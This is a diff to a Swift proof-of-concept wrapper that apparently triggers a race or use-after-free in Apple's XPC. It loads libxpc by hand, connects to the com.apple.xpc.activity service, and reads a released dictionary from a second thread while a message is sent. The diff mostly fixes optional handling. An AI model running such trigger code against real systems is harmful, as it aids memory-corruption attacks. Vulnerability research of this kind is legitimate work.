@@ -5,7 +5,7 @@ import Foundation
 // Objective-C wrapper for C PoC code
 @objc class XPCPoC: NSObject {
     // C structs
-    typealias xpc_object_t = UnsafeMutableRawPointer
+    typealias xpc_object_t = UnsafeMutableRawPointer?
 
     struct OS_xpc_object {
         var superclass_opaque: (UInt8, UInt8, UInt8, UInt8, UInt8, UInt8, UInt8, UInt8)
@@ -47,9 +47,8 @@ import Foundation
 
     // Initialize function pointers
     @objc static func initXPCFunctions() {
-        let libxpc = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY)
-        guard libxpc != nil else {
-            print("Failed to load libxpc.dylib: \(String(cString: dlerror()))")
+        guard let libxpc = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY) else {
+            print("Failed to load libxpc.dylib: \(String(cString: dlerror() ?? "Unknown error"))")
             return
         }
 
@@ -80,8 +79,7 @@ import Foundation
             return "Failed to initialize XPC functions"
         }
 
-        let conn = createConn("com.apple.xpc.activity", nil, 0)
-        guard conn != nil else {
+        guard let conn = createConn("com.apple.xpc.activity", nil, 0) else {
             return "Failed to create connection"
         }
 
@@ -100,12 +98,14 @@ import Foundation
         xpc_release_ptr?(value)
 
         var thread: pthread_t?
-        let threadResult = pthread_create(&thread, nil, { arg in
-            let d = arg.assumingMemoryBound(to: xpc_object_t.self).pointee
-            let val = xpc_dictionary_get_value_ptr?(d, "key")
-            result = String(format: "Thread accessed value: %p", val ?? UnsafeMutableRawPointer(bitPattern: 0)!)
-            return nil
-        }, dict)
+        let threadResult = withUnsafeMutablePointer(to: &dict) { dictPtr in
+            pthread_create(&thread, nil, { arg in
+                guard let d = arg?.assumingMemoryBound(to: xpc_object_t.self).pointee else { return nil }
+                let val = xpc_dictionary_get_value_ptr?(d, "key")
+                result = String(format: "Thread accessed value: %p", val ?? UnsafeMutableRawPointer(bitPattern: 0)!)
+                return nil
+            }, dictPtr)
+        }
 
         if threadResult != 0 {
             xpc_release_ptr?(dict)
@@ -117,7 +117,8 @@ import Foundation
         xpc_connection_send_message_ptr?(conn, dict)
 
         if let thread = thread {
-            pthread_join(thread, nil)
+            var threadReturn: UnsafeMutableRawPointer?
+            pthread_join(thread, &threadReturn)
         }
         xpc_release_ptr?(conn)
         return result
